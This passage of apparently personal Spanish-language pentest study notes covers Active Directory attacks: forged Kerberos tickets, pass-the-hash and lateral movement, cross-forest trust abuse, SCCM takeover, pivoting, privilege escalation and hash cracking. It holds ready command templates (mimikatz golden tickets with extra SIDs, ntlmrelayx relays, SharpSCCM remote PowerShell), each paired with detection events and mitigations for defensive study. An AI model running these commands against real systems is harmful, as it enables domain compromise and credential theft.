- **ATT&CK:** T1003.005 (Cached Domain Credentials).
- **Mitigación:** limitar `CachedLogonsCount`, Protected Users (no se cachean sus credenciales), contraseñas fuertes para resistir el crackeo, admin local sin reutilización.

---

**Resumen ofensiva → detección → mitigación**

| Técnica | Herramienta clave | Event ID delator | ATT&CK | Mitigación núcleo |
|---|---|---|---|---|
| DCSync | secretsdump `-just-dc` / mimikatz dcsync | 4662 GUID `1131f6ad` (Get-Changes-All) fuera de DC | T1003.006 | RBAC replicación, Protected Users |
| LSASS dump | mimikatz sekurlsa / comsvcs / pypykatz | Sysmon 10 sobre lsass | T1003.001 | PPL, Credential Guard, WDigest off |
| SAM/SECURITY | reg save / secretsdump `-sam` | 4688 reg save; 7045/5145 remoto | T1003.002 / .004 | LAPS, restringir admin local |
| DPAPI | SharpDPAPI / mimikatz dpapi / impacket | 4692/4693 masterkey; acceso a \Protect\<SID> | T1555.003/.004 | Credential Guard, proteger DC |
| LAPS | nxc --laps / LAPSDumper / bloodyAD | 4662 lectura atributo LAPS | T1555 *(aprox.)* | ACL estricta, Windows LAPS cifrado |
| gMSA | gMSADumper / nxc --gmsa / bloodyAD | 4662 sobre msDS-ManagedPassword | T1555 *(aprox.)* | minimizar PrincipalsAllowed... |
| Cached creds | secretsdump LOCAL + hashcat -m 2100 | 4688 reg save HKLM\SECURITY | T1003.005 | CachedLogonsCount, Protected Users |

---

#### Zoo de tickets + movimiento lateral

> **Alcance:** solo objetivos autorizados (lab propio, HTB, engagement con permiso escrito). Forjar tickets Kerberos sobre un dominio ajeno es delito. Todo lo de abajo es material de pizarra: cada técnica ofensiva lleva su gemelo defensivo (Event ID + ATT&CK + mitigación).

**Concepto de base (para la pizarra):** Kerberos = TGT (te lo firma el `krbtgt`, prueba QUIÉN sos) + TGS (te lo firma la cuenta del servicio, prueba a QUÉ servicio accedés). El PAC dentro del ticket dice tus grupos/privilegios. Cada tipo de "ticket falso" ataca una firma distinta.

> **Nota ATT&CK (importante):** MITRE **no** define subtécnica propia para **Diamond** ni **Sapphire**. Ambas son variantes de Golden y se agrupan convencionalmente bajo **T1558.001** (Golden Ticket). No existe un `T1558.00x` "Diamond" o "Sapphire": si ves uno citado, está inventado.

##### 1) El zoo de tickets forjados

| Ticket | Qué es (1 línea) | Qué firma / secreto necesito | Ruido / detectabilidad |
|---|---|---|---|
| **Golden** | TGT forjado de cero: sos "cualquiera" en el dominio, offline | hash NTLM/AES del **krbtgt** | Alto si el lifetime es raro; se forja sin pedir 4768 |
| **Silver** | TGS forjado a **un** servicio puntual, no toca el DC | hash NT/AES de la **service account** (o cuenta de máquina `$`) | Bajo: nunca habla con el KDC; solo lo ve el host destino |
| **Diamond** | Se pide un TGT **legítimo** y se le reescribe el PAC (grupos), re-cifrando con la clave del krbtgt | clave (AES) del **krbtgt** + creds de un user real | Menor que golden: sí hay 4768 previo real |
| **Sapphire** | Se obtiene un PAC de admin **real** vía S4U2self+U2U y se inyecta en un ticket firmado con krbtgt | clave del krbtgt + **creds de un usuario válido** (para el `-request`/S4U2self) | Muy bajo: el PAC es genuino, no inventado |

**(a-d) Detalle por técnica**

| Técnica | Cómo (herramienta + comando mínimo) | Detección (Event ID + qué lo delata) | ATT&CK | Mitigación |
|---|---|---|---|---|
| **Golden Ticket** | Impacket `ticketer.py -nthash <krbtgt> -domain-sid <SID> -domain corp.lab Administrator` → `.ccache`; o `mimikatz kerberos::golden`. Luego PtT. | **4769** (TGS req) sin **4768** (TGT req/AS-REQ) previo del mismo user; lifetime anómalo (mimikatz default **10 años** — confirmado); RC4 (eType 0x17) cuando el dominio es AES | **T1558.001** | Rotar **krbtgt dos veces** (invalida golden vivos); alertar lifetime > política; forzar AES |
| **Silver Ticket** | `ticketer.py -nthash <svc_hash> -domain-sid <SID> -spn cifs/host corp.lab user` → PtT contra ese host | **4624** logon tipo 3 en el host **sin 4768/4769 correlativos en el DC**; el DC no ve nada → la correlación host↔DC es la clave | **T1558.002** | gMSA (hash rota solo); no reusar cuentas de servicio; auditar SPN; monitoreo local del host destino |
| **Diamond Ticket** | Rubeus `diamond /krbkey:<krbtgt_aes> /ticketuser:<u> /ticketuserid:<rid> /groups:512 /tgtdeleg` | 4768 real seguido de 4769 con **grupos que no corresponden** al user; discrepancia PAC vs. membresía real (AD) | **T1558.001** (variante de Golden; MITRE no tiene ID propio de Diamond) | Rotar krbtgt x2; PAC validation; correlacionar grupos del ticket vs. directorio |
| **Sapphire Ticket** | Impacket `ticketer.py ... -impersonate Administrator -request` (S4U2self + U2U trae PAC real de admin) | 4769 con S4U2self hacia el propio requester; TGS a `krbtgt`/U2U inusual; requester ≠ target del PAC | **T1558.001** (variante de Golden; MITRE no tiene ID propio de Sapphire) | Rotar krbtgt x2; restringir constrained delegation; tiering de cuentas privilegiadas |
| **Skeleton Key** | `mimikatz misc::skeleton` parchea LSASS del DC → password maestro universal (RC4, pass por defecto `mimikatz`) en RAM | **Sysmon 10/8** (ProcessAccess/CreateRemoteThread) contra LSASS del DC; degradación forzada a **RC4**; auth exitosa con pass falso; se cae al reiniciar el DC | **T1556.001** (Modify Authentication Process: **Domain Controller Authentication**) | Protected Users, LSASS as PPL / Credential Guard, alerta sobre inyección en lsass del DC |

##### 2) Uso de credenciales / tickets (cómo se "montan")

| Técnica | Qué es | Cómo (mínimo) | Detección | ATT&CK | Mitigación |
|---|---|---|---|---|---|
| **Pass-the-Hash (PtH)** | Autenticar con el NTLM sin conocer el password | `impacket-psexec -hashes :<NT> corp/user@host` o `evil-winrm -H <NT>` | **4624** logon tipo 3 + **4776** (validación NTLM); RC4/NTLM donde debería ir Kerberos | **T1550.002** | Deshabilitar NTLM donde se pueda; Protected Users; LAPS (rompe hash local reutilizado); tiering |
| **Pass-the-Ticket (PtT)** | Reusar un `.ccache`/`.kirbi` ya forjado o robado | `export KRB5CCNAME=tkt.ccache` → `impacket-psexec -k -no-pass corp/user@host` | 4769 sin 4768; ticket usado desde IP/host distinto al de emisión | **T1550.003** | Rotar krbtgt; acortar lifetime; detección de "ticket viajero" (host emisor ≠ usuario) |
| **OverPass-the-Hash** (pass-the-key) | Del hash NTLM/AES obtengo un **TGT** real (paso a Kerberos) | `impacket-getTGT -hashes :<NT> corp/user` → `KRB5CCNAME=user.ccache` | **4768** con tipo de cifrado **RC4** (eType 0x17) para un user que normalmente usa AES (downgrade) | **T1550.002 / T1550.003** (híbrido: parte de un hash, produce/usa un TGT; MITRE no tiene ID dedicado) | Forzar AES; alertar 4768 RC4; Protected Users (fuerza AES, sin RC4/DES) |

##### 3) Movimiento lateral (ejecución remota)

| Herramienta | Mecanismo | Comando mínimo | Detección (Event ID) | ATT&CK | Mitigación mínima |
|---|---|---|---|---|---|
| **impacket psexec** | Sube binario a `ADMIN$` + crea servicio | `impacket-psexec corp/u@host -hashes :<NT>` | **7045** (servicio nuevo, log System), **4697** (log Security), **5145** (share ADMIN$), Sysmon **11/13** | **T1021.002 / T1569.002** | Tiering; deshabilitar NTLM; alertar servicios con binPath a temp/cmd |
| **impacket smbexec** | Servicio semi-interactivo vía SMB, menos huella en disco | `impacket-smbexec corp/u@host` | **7045/4697**; **4688** cmd.exe hijo raro | **T1021.002 / T1569.002** | Ídem psexec; EDR sobre creación de servicios efímeros |
| **impacket wmiexec** | Ejecuta vía **WMI** (Win32_Process), sin servicio | `impacket-wmiexec corp/u@host -hashes :<NT>` | **4624** tipo 3 + Sysmon **1** (`WmiPrvSE.exe`→cmd); **4688** | **T1047** | Restringir WMI remoto; alertar WmiPrvSE.exe→shell |
| **impacket atexec** | Ejecuta vía **Programador de tareas** | `impacket-atexec corp/u@host <cmd>` | **4698** (tarea creada), **4700/4702** (habilitada/actualizada); Sysmon 1 | **T1053.005** | Auditar tareas remotas; alertar tarea con acción de shell |
| **impacket dcomexec** | Ejecuta vía **DCOM** (MMC20.Application, ShellWindows/ShellBrowserWindow) | `impacket-dcomexec corp/u@host` | **4624** tipo 3; Sysmon 1 con padre `mmc.exe` (MMC20) o `explorer.exe` (ShellWindows) | **T1021.003** | Endurecer permisos DCOM; alertar mmc.exe/explorer.exe→cmd |
| **evil-winrm** | Shell sobre **WinRM/WSMan** (5985/5986) | `evil-winrm -i host -u u -H <NT>` | **4624** tipo 3; procesos hijo de `wsmprovhost.exe` (Sysmon 1) | **T1021.006** | Limitar WinRM a hosts de admin; JEA; alertar wsmprovhost.exe→shell |
| **sc / schtasks** (nativos) | Living-off-the-land para servicio/tarea remota | `sc \\host create svc binPath= "..."` ; `schtasks /create /s host ...` | **7045** (sc, log System), **4697** (Security); **4698** (schtasks) | **T1543.003 / T1569.002 / T1053.005** | Restringir SeServiceLogonRight; auditar SCM y tareas |

##### 4) Radar defensivo — resumen para el blue team

| Señal | Qué caza | Regla mental |
|---|---|---|
| **4769 sin 4768** previo (mismo user/ventana) | Golden / Silver / PtT | Un TGS sin TGT que lo respalde = ticket forjado o robado |
| **Lifetime anómalo** en el ticket | Golden (default de mimikatz 10 años) | La política de dominio suele ser 10h/7d; > eso = alarma |
| **Encryption downgrade** (RC4 donde va AES) | OverPtH, Skeleton Key, golden viejo | 4768/4769 con eType 0x17 (RC4) para cuenta AES-capable |
| **4624 logon tipo 3** en volumen anómalo | PtH / PtT / lateral SMB-WMI | Correlacionar con 4776 (NTLM) y con el DC |
| **7045 / 4697** (servicio nuevo) | psexec/smbexec/sc | binPath con cmd/powershell/rutas temp = rojo (7045 en System, 4697 en Security) |
| **4698** (tarea nueva) + 4700/4702 | atexec/schtasks | Tarea remota con acción de shell |
| **5145** (share object checked) sobre **ADMIN$** | psexec/smbexec | Acceso a ADMIN$ desde host inusual |
| **Sysmon 1** (process create) | Todos los exec remotos | Padres sospechosos: `services.exe`→cmd, `WmiPrvSE.exe`→cmd, `mmc.exe`→cmd, `wsmprovhost.exe`→shell |
| **Sysmon 8/10** contra lsass.exe | Skeleton Key, dumping de krbtgt/svc | CreateRemoteThread/ProcessAccess a LSASS del DC = crítico |
| **Silver = punto ciego del DC** | Silver Ticket | El DC NO lo ve → hay que loguear y correlacionar **en el host destino** |

##### 5) Mitigaciones estructurales (las que matan familias enteras)

| Control | Qué corta |
|---|---|
| **Rotar krbtgt DOS veces** (con intervalo de replicación entre ambas) | Invalida Golden, Diamond, Sapphire vivos; la doble rotación evita que el TGT emitido con la clave N-1 siga válido |
| **gMSA para cuentas de servicio** | Password/hash rota automáticamente (default cada **30 días**) → Silver Ticket y Kerberoasting quedan sin combustible durable |
| **Tiering (Tier 0/1/2)** | Impide que un hash de Tier-0 (DA, krbtgt) aparezca en un workstation Tier-2 → corta PtH/OverPtH cross-tier |
| **LAPS** | Password de admin local único y rotado por máquina → mata el reuso de hash local para lateral |
| **Protected Users + Credential Guard** | Fuerza AES (sin RC4/NTLM), no cachea creds reusables → degrada PtH y downgrade |
| **AES only / deshabilitar RC4-DES** | Elimina el downgrade que delata (y habilita) golden/OverPtH RC4 |

**ATT&CK del dominio (resumen):** T1558 *Steal or Forge Kerberos Tickets* — T1558.001 (Golden; y variantes Diamond/Sapphire, que **no** tienen subtécnica propia en MITRE), T1558.002 (Silver); T1550 *Use Alternate Authentication Material* — T1550.002 (PtH), T1550.003 (PtT). Lateral: T1021.002 (SMB/psexec), T1021.003 (DCOM), T1021.006 (WinRM), T1047 (WMI), T1053.005 (Scheduled Task), T1543.003 / T1569.002 (Windows Service). Skeleton Key: **T1556.001** (*Modify Authentication Process: Domain Controller Authentication*).

---

#### Trusts y movimiento inter-dominio / inter-bosque

> **Alcance:** todo lo de abajo es material de pizarra/entrevista y solo se practica en lab propio, HTB o engagement con permiso escrito. Los trusts son la superficie donde un compromiso de dominio "hijo" escala a bosque completo, así que cada técnica ofensiva lleva su gemelo defensivo (Event ID + ATT&CK + mitigación).

**Modelo mental: tipos de trust**

| Trust | Cuándo se crea | Transitividad | Dirección | SID filtering por defecto |
|---|---|---|---|---|
| Parent-child | Automático al agregar un dominio hijo al árbol | Transitivo | Bidireccional | **No** (mismo bosque = confía en SIDs) |
| Tree-root | Automático al agregar un nuevo árbol al bosque | Transitivo | Bidireccional | **No** |
| External | Manual, dominio↔dominio de otro bosque (o NT4) | **No** transitivo | Uni o bidireccional | **Sí** (quarantine) |
| Forest | Manual, forest-root↔forest-root | Transitivo dentro de cada bosque | Uni o bidireccional | **Sí** (selectivo, se puede aflojar) |
| Realm | Manual, hacia Kerberos no-Windows (MIT/Heimdal) | Configurable | Uni o bidireccional | Sí |

Idea central: la **frontera de seguridad es el bosque, no el dominio**. Dentro del mismo bosque NO hay SID filtering entre parent y child → un compromiso de dominio hijo es, por diseño, compromiso del forest root. Entre bosques SÍ hay SID filtering/quarantine, que es lo que la mayoría de estas técnicas intenta sortear.

---

**1) SID History injection en Golden Ticket (child → forest root)**
- **(a) Qué es:** al forjar un TGT (golden ticket) de un dominio hijo comprometido, se agrega en el campo *ExtraSids* el SID del grupo **Enterprise Admins** del dominio raíz (`S-1-5-21-<root>-519`). Como intra-forest no se filtra el SID History, el DC del root honra ese SID y el ticket queda con privilegios de forest root.
- **(b) Cómo:** con el hash `krbtgt` del hijo (obtenido por DCSync) → `mimikatz kerberos::golden /user:Administrator /domain:child.corp.local /sid:<SID-child> /krbtgt:<hash> /sids:<SID-root>-519 /ptt`. Equivalente en Impacket: `ticketer.py -nthash <krbtgt_child> -domain-sid <SID-child> -extra-sid <SID-root>-519 ...`.
- **(c) Detección:** el PAC no se vuelca en el log, así que los ExtraSids no aparecen literalmente en el evento; la señal es de **correlación**: **4769** (TGS request) en el DC del root **sin un 4768 (AS-REQ) legítimo previo** de esa cuenta (huella golden clásica), lifetime anómalo (mimikatz por defecto ~10 años), y **4672** (Special privileges assigned to new logon) sobre cuentas que no deberían tenerlos.
- **(d) MITRE:** T1134.005 (SID-History Injection) + T1558.001 (Golden Ticket).
- **(e) Mitigación:** proteger `krbtgt` del hijo (rotación doble), tratar a **todo admin de cualquier dominio del bosque como Tier 0**, monitoreo de DCSync (4662 con GUID de replicación `DS-Replication-Get-Changes`), y asumir que child DC comprometido = bosque comprometido en el modelo de amenazas.

**2) Inter-realm TGT con trust key (referral cross-domain)**
- **(a) Qué es:** cuando A confía en B, existe una **clave de trust** compartida; con ella se forja el *inter-realm/referral TGT* que A entrega para que el cliente pida servicios en B, saltando el flujo normal de referral.
- **(b) Cómo:** extraer la trust key (`lsadump::trust /patch` en mimikatz) y forjar el referral: `mimikatz kerberos::golden /user:Admin /domain:child.corp.local /sid:<SID-child> /sids:<SID-root>-519 /rc4:<trust_key> /service:krbtgt /target:corp.local /ticket:referral.kirbi`.
- **(c) Detección:** **4769** *cross-realm* en el DC destino (campo Service = `krbtgt/DOMINIO-DESTINO`), donde el `Account Domain` del solicitante difiere del dominio del servicio; frecuencia anómala de referrals desde un solo host. (Nota: los referrals cross-domain son TGS-REQ → 4769, no AS-REQ/4768.)
- **(d) MITRE:** T1134.005 + T1558.
- **(e) Mitigación:** rotar la trust key periódicamente (no se rota sola), SID filtering en trusts externos, y en trusts de bosque activar filtrado para descartar SIDs foráneos privilegiados.

**3) Cross-forest Kerberoast y foreign group membership**
- **(a) Qué es:** desde el bosque A, pedir tickets de servicio (Kerberoast) para SPNs de cuentas del bosque B a través del trust, y crackearlos offline; o abusar de **membresías foráneas** (un principal de A metido en un grupo de B) para acceso directo.
- **(b) Cómo:** `Rubeus.exe kerberoast /domain:target.forest.local` a través del trust, o `GetUserSPNs.py -target-domain target.forest.local corp.local/user:pass`. Enumeración de foreign members / foreign ACLs con BloodHound (aristas *ForeignGroupMembership* / *ForeignAdmin*).
- **(c) Detección:** **4769** con **Ticket Encryption Type 0x17 (RC4-HMAC)** para SPNs de cuentas de servicio del bosque remoto y volumen alto de TGS-REQ desde una sola cuenta; alertar sobre 4769 cross-realm hacia SPNs sensibles.
- **(d) MITRE:** T1558.003 (Kerberoasting), T1482 (Domain Trust Discovery).
- **(e) Mitigación:** cuentas de servicio con contraseñas largas/gMSA, AES en vez de RC4, revisar membresías foráneas periódicamente, **selective authentication** en el trust para que principals de A no puedan autenticarse contra cualquier recurso de B.

**4) Descubrimiento de trusts (previo a todo)**
- **(a) Qué es:** mapear qué trusts existen, dirección y transitividad, para elegir la ruta de escalada.
- **(b) Cómo:** `nltest /domain_trusts /all_trusts`, `Get-ADTrust -Filter *`, o BloodHound (colección de dominios y aristas de trust).
- **(c) Detección:** **4662** (acceso a objetos de directorio, `trustedDomain`) —y **4661** para handles a objetos SAM/DS—, y consultas LDAP masivas al contenedor `CN=System` desde un host no administrativo.
- **(d) MITRE:** T1482 (Domain Trust Discovery).
- **(e) Mitigación:** no se bloquea (es funcionalidad legítima); se detecta por comportamiento y se reduce superficie eliminando trusts innecesarios.

**5) Abuso de TGT delegation cross-trust (unconstrained delegation atravesando el trust)**
- **(a) Qué es:** si un host con **unconstrained delegation** en el bosque A recibe una autenticación de un principal de B (p. ej. forzada), el TGT de ese principal foráneo queda cacheado en LSASS del host y puede reutilizarse. Requiere que la opción **TGT Delegation** esté habilitada en el trust (por defecto está **deshabilitada** en trusts de bosque desde parches recientes de Microsoft; habilitada históricamente / en intra-forest).
- **(b) Cómo:** coerción de un DC/host del bosque remoto con `PrinterBug`/`PetitPotam` (`printerbug.py`, `Coercer`) hacia el host con unconstrained deleg → capturar y reutilizar el TGT con `Rubeus.exe monitor` / `triage` → `ptt`.
- **(c) Detección:** **4769** solicitando el TGT del DC remoto; tráfico entrante MS-RPRN/MS-EFSR hacia el host de delegación visible como **Sysmon Event ID 18 (Pipe Connected)** / **17 (Pipe Created)** sobre `\pipe\spoolss` / `\pipe\efsrpc` (y, con auditoría de share, **5145** sobre esos pipes en IPC$); además **4768/4769** por cuentas `DC$` del bosque remoto contra recursos de A.
- **(d) MITRE:** T1187 (Forced Authentication), T1550.003 (Pass the Ticket), T1482.
- **(e) Mitigación:** eliminar unconstrained delegation (usar delegación restringida/RBCD), mantener **TGT Delegation = disabled** en trusts de bosque, parchear coerción (PetitPotam/PrinterBug), y marcar cuentas sensibles como *"Account is sensitive and cannot be delegated"* / grupo **Protected Users**.

---

**SID filtering / quarantine — por qué intra-forest no lo aplica**

| Escenario | ¿SID filtering activo? | Consecuencia |
|---|---|---|
| Parent-child / tree-root (mismo bosque) | **No** | ExtraSids/SID History del root son aceptados → base de la técnica 1 |
| External trust | **Sí** (quarantine, `netdom trust ... /quarantine:yes`) | SIDs foráneos ≠ del dominio confiado son descartados |
| Forest trust | **Sí**, pero se puede aflojar (`/enablesidhistory:yes`) | Aflojarlo reabre SID History cross-forest |

Regla de oro para blue team: **el bosque es el límite de confianza**. Un DC hijo comprometido no es "un dominio menos importante": es Tier 0 del bosque entero.

---

**Resumen defensivo (tabla de bolsillo)**

| Señal | Event ID | Qué la delata |
|---|---|---|
| Golden/SID-History cross-domain | 4769 (+ 4672) | 4769 sin 4768 (AS-REQ) legítimo previo; lifetime anómalo; 4672 en cuentas inesperadas |
| Kerberoast cross-forest | 4769 | Enc type 0x17 (RC4-HMAC) sobre SPNs remotos, volumen alto por cuenta |
| Referral / inter-realm TGT | 4769 cross-realm | Service=`krbtgt/<destino>`, Account Domain ≠ dominio del servicio |
| Coerción para deleg cross-trust | Sysmon 17/18 (o 5145) | Conexión a `\pipe\spoolss` o `\pipe\efsrpc`; 4769 pidiendo TGT de DC remoto |
| Enumeración de trusts | 4662 (/ 4661) | Acceso a objetos `trustedDomain` desde host no-admin |

**Mitigaciones estructurales:** SID filtering + quarantine en trusts externos; **selective authentication** en trusts de bosque; **tiering** estricto donde el admin del **forest root = Tier 0**; eliminar unconstrained delegation; rotar `krbtgt` y trust keys; parchear coerción; eliminar trusts que no se usan.

**MITRE ATT&CK cubiertos:** T1134.005 (SID-History Injection), T1482 (Domain Trust Discovery), T1558 / T1558.001 (Golden Ticket) / T1558.003 (Kerberoasting), T1550.003 (Pass the Ticket), T1187 (Forced Authentication).

---

#### SCCM / MECM (Configuration Manager) abuse

> **Alcance:** técnicas para lab propio, HTB o engagement con permiso escrito. SCCM es el sistema nervioso de despliegue de la corp: comprometer el site server suele equivaler a control administrativo sobre miles de endpoints. Nomenclatura de referencia: proyecto **Misconfiguration Manager** (SpecterOps) — CRED / ELEVATE / EXEC / RECON / TAKEOVER.

**Modelo mental:** Site Server (jerarquía CAS/Primary) → SMS Provider (expone **AdminService**, REST sobre IIS/HTTPS) → Site Database (**MSSQL**) → Management Point (MP, atiende clientes) → Distribution Point (DP, contenido + PXE) → Clientes (servicio `CcmExec`, políticas en WMI `root\ccm\policy`). Casi todo abuso nace de: credenciales reutilizables (NAA), autenticación coaccionable del machine account, o roles RBAC mal tiereados.

---

**Reconocimiento**

| Qué | Cómo (mínimo ilustrativo) | ATT&CK |
|---|---|---|
| Descubrir infraestructura vía LDAP (contenedor `System Management`, objetos `mSSMSManagementPoint`, site codes) | `sccmhunter.py find -u user -p pass -d dom.local -dc-ip <DC>` | T1018 / T1046 |
| Enumerar roles, colecciones y usuarios SCCM (post-cred) | `sccmhunter.py show -users` · `SharpSCCM.exe get primary-users` | T1087 |

Delator azul: lecturas LDAP anómalas al contenedor `CN=System Management` → **Event ID 4662** (acceso a objeto AD) con auditoría de objeto (SACL) habilitada; consultas SMB al share `SMS_<sitecode>`.

---

**Vectores ofensivos (cada uno con su gemelo defensivo)**

**1. Network Access Account (NAA) — credenciales recuperables** *(CRED-2 vía policy request · CRED-3 vía disco)*
- **Qué:** el NAA es una cuenta de dominio que los clientes usan para leer contenido; su política se entrega a cada cliente y queda cifrada con DPAPI (SYSTEM) en WMI.
- **Cómo:** con SYSTEM en cualquier cliente, `SharpSCCM.exe local secrets -m disk` (deobfusca el secreto del CIM repository = CRED-3), o pedir la política al MP sin tocar disco: `SharpSCCM.exe get naa` (policy request = CRED-2). Recupera texto plano de `CCM_NetworkAccessAccount` bajo `root\ccm\policy\Machine\ActualConfig`.
- **Detección:** **Sysmon Event ID 1/10** — proceso no-Microsoft leyendo la clave DPAPI o accediendo a WMI de política; **Sysmon 11** al volcar blobs; en el MP, request de política de un cliente recién "registrado" no legítimo.
- **ATT&CK:** T1555 (Credentials from Password Stores) / T1078.
- **Mitigación:** eliminar NAA y usar **Enhanced HTTP** / cuentas gestionadas; si es imprescindible, cuenta de mínimo privilegio sin derechos interactivos ni sobre el dominio.

**2. PXE boot media sin contraseña** *(CRED-1)*
- **Qué:** un DP con PXE mal configurado sirve medios de arranque cuyos "media variables" contienen credenciales de unión a dominio / NAA.
- **Cómo:** `pxethief.py 2 <DP_IP>` descarga el archivo de media variables y extrae/crackea las variables (el cifrado deriva de una password vacía o débil).
- **Detección:** picos de **requests DHCP/PXE (UDP 67/68/69, 4011)** desde hosts no aprovisionables; logs operativos de **WDS**; descargas TFTP de `boot.wim`/media variables fuera de ventana de despliegue.
- **ATT&CK:** T1552.001 (Unsecured Credentials: Credentials In Files) / T1078.
- **Mitigación:** exigir **PXE password** fuerte, segmentar VLAN de PXE, y no embeber NAA en medios.

**3. Site takeover vía relay del machine account del site server** *(TAKEOVER-1 / TAKEOVER-2)*
- **Qué:** se coacciona la autenticación NTLM del **machine account** del site server y se relaya para escalar a control del sitio.
- **Cómo:**
  - a MSSQL (site DB) → **TAKEOVER-1**: `ntlmrelayx.py -t mssql://<siteDB> -smb2support -socks` + coerción (PetitPotam/PrinterBug) → el machine account suele ser `sysadmin` en la DB → insertar rol **Full Administrator** en las tablas RBAC.
  - al **AdminService** → **TAKEOVER-2**: `ntlmrelayx.py -t https://<smsprovider>/AdminService/... ` → altas de administrador SMS vía API.
- **Detección:** **Event ID 4624 Tipo 3 con paquete NTLM** donde el origen del logon (IP) no coincide con el host del machine account (firma clásica de relay); **4648** (uso explícito de credenciales); logins NTLM del site-server account contra MSSQL en el SQL error log/audit; correlación con **4662**/coerción (EFSRPC, MS-RPRN).
- **ATT&CK:** T1557.001 (AiTM: LLMNR/NBT-NS Poisoning and SMB Relay) / T1078.
- **Mitigación:** **EPA (Extended Protection for Authentication)** + `Require SSL` en MSSQL y en IIS del SMS Provider; **SMB signing**; **tiering del site server como Tier 0**; deshabilitar NTLM donde se pueda; mitigar coerción (parches PetitPotam, RPC filters).

**4. CMPivot / despliegue — de query en vivo a RCE sobre clientes** *(EXEC-2 CMPivot / EXEC-1 deploy)*
- **Qué:** con rol SCCM adecuado, CMPivot ejecuta consultas en tiempo real contra clientes (leer archivos/registro/procesos) vía AdminService/MP (**EXEC-2**), y el despliegue de aplicaciones/scripts da **RCE como SYSTEM** en el endpoint (**EXEC-1**).
- **Cómo:** `SharpSCCM.exe invoke admin-service -q "..."` (CMPivot) para recon en cliente; `SharpSCCM.exe exec -d <device> -p "powershell -e <b64>"` para desplegar y ejecutar como SYSTEM.
- **Detección:** en el cliente, **Sysmon Event ID 1 / Security 4688** con `CcmExec.exe`/`ccmsetup` o `WmiPrvSE.exe` engendrando `powershell.exe`/`cmd.exe`; logs `Scripts.log`/`CMPivot`; en servidor, entradas de despliegue "puntuales" sobre colecciones ad-hoc.
- **ATT&CK:** T1072 (Software Deployment Tools) / T1059.001.
- **Mitigación:** **RBAC de mínimo privilegio** (limitar quién tiene CMPivot/Script Approver/deploy), aprobación de scripts en dos personas, monitoreo de despliegues a colecciones nuevas.

**5. Credential harvesting en el Management Point** *(CRED-2)*
- **Qué:** el MP acepta registros de cliente y entrega políticas (incluida la del NAA) a cualquier host que se registre; un rogue client cosecha secretos sin tocar un endpoint real.
- **Cómo:** registrar un cliente falso y pedir la política de máquina: `SharpSCCM.exe get naa` / módulo `http` de `sccmhunter` para hablar con el MP.
- **Detección:** registros de cliente desde hosts sin objeto de equipo válido; en el MP, `MP_RegistrationManager.log` con GUIDs nuevos; pico de policy requests.
- **ATT&CK:** T1078 / T1555.
- **Mitigación:** **Enhanced HTTP / PKI** con validación de certificado de cliente y aprobación manual de clientes; retirar NAA.

---

**Resumen defensivo (prioridad blue team)**

| Control | Cierra |
|---|---|
| PXE password + VLAN PXE segmentada | Vector 2 |
| Quitar NAA → Enhanced HTTP/PKI, aprobación de clientes | Vectores 1 y 5 |
| EPA + Require SSL en MSSQL y AdminService, SMB signing | Vector 3 |
| Site server + SMS Provider + DB como **Tier 0** | Vector 3 y contención general |
| RBAC mínimo, aprobación de scripts, alertas de despliegue ad-hoc | Vector 4 |
| Alertas SIEM: 4624 T3 NTLM con IP-origen dispar, 4648, 4662 al `System Management` | Detección transversal |

**ATT&CK global del dominio:** T1078 (Valid Accounts), T1557 / T1557.001 (AiTM / SMB Relay), T1555, T1552.001, T1072, T1059.001, T1046/T1018 (recon).

---

## 5. 🔀 Pivoting & tunneling (imprescindible con >1 host / AD)

| Tool | Para qué |
|---|---|
| **chisel** | túnel TCP/SOCKS sobre HTTP (server en kali, client en el target) |
| **ligolo-ng** | pivoting moderno vía interfaz `tun` (cómodo para subredes internas) |
| **sshuttle** | "VPN por SSH" a una subred si tenés creds SSH |
| **ssh -L / -R / -D** | port-forward local/remoto / proxy SOCKS dinámico |
| **proxychains** | forzar cualquier tool a través del SOCKS del pivot |

**Idea:** comprometés host A (con acceso a la red interna), montás un SOCKS por A, y con `proxychains nxc/impacket ...` atacás hosts internos que no tocás directo.

---

## 6. 🐧 Privesc Linux

**Enumeración:** `linpeas.sh`, `pspy` (procesos/cron sin root), `sudo -l`, `id`, `find / -perm -4000` (SUID), `getcap -r /`, `crontab -l` + `/etc/cron*`, `cat /etc/mounts`.

| Vector | Cómo |
|---|---|
| **sudo mal config** | `sudo -l` → binario abusable (**GTFOBins**) |
| **SUID / capabilities** | binario SUID root o `cap_setuid`/`cap_dac_...` abusable (GTFOBins) |
| **cron / scripts writable** | script corrido por root que podés editar (`pspy` para verlos) |
| **PATH hijack** | script root que llama un binario por nombre relativo |
| **kernel exploit** | último recurso (DirtyPipe/DirtyCOW/pwnkit según versión) |
| **NFS `no_root_squash`** | montar y dejar un SUID root |

**Container escape (checklist que usé en Nimbus):** `id` + `/proc/self/status` (CapEff — ¿caps extra?), `ls /var/run/docker.sock` (socket montado = escape trivial), `cat /proc/mounts` (¿monta el host? `/dev/sd*`, `/host`), `find / -perm -4000`, `capsh --print`. Si `CapEff=0` y sin docker.sock ni mounts del host → contenedor blindado, buscar el privesc por **red/cloud** (como en Nimbus → LocalStack).

---

## 7. 🪟 Privesc Windows

**Enumeración:** `winPEAS`, `PowerUp.ps1`, `whoami /priv`, `whoami /all`, `systeminfo`.

| Vector | Cómo |
|---|---|
| **SeImpersonate/SeAssign** | *Potato* (Juicy/Rogue/GodPotato) → SYSTEM. Común en cuentas de servicio/IIS/MSSQL |
| **Unquoted service path** | ruta de servicio con espacios sin comillas → plantar binario |
| **Weak service perms** | servicio reconfigurable (`sc config`) → correr tu binario como SYSTEM |
| **AlwaysInstallElevated** | instalar `.msi` como SYSTEM |
| **Creds guardadas** | `cmdkey /list`, registry (`reg query`), archivos `unattend.xml`/`web.config` |
| **DLL hijacking** | DLL faltante en un path escribible cargada por proceso privilegiado |

---

## 8. 🔓 Password attacks / cracking

| Tool | Para qué |
|---|---|
| **hashcat** | cracking GPU. Modos: `-m 0` MD5, `-m 1000` NTLM, `-m 1800` sha512crypt, `-m 13100` Kerberoast, `-m 18200` AS-REP, `-m 16500` JWT, `-m 22000` WPA |
| **john** (JtR) | cracking CPU + `*2john` (ssh2john, zip2john, keepass2john…) para extraer hashes |
| **hydra** / **medusa** | brute-force de servicios online (ssh, ftp, http-form) — cuidado con lockout |
| **rockyou.txt** + **rules** (`best64`, `OneRuleToRuleThemAll`) | wordlist base + mutaciones |

---

## 9. 🐚 Shells & post-explotación

